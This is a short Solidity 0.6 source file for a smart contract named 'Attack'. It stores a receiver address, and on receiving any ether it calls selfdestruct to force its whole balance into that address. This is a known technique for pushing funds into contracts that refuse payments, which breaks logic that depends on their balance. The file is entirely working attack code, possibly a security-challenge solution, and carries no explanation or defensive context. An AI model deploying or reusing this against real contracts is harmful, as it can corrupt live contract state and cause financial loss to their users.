// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    address _balanceReceiver;

    constructor(address _to) public {
        _balanceReceiver = _to;
    }

    receive() external payable {
        selfdestruct(payable(_balanceReceiver));
    }
}
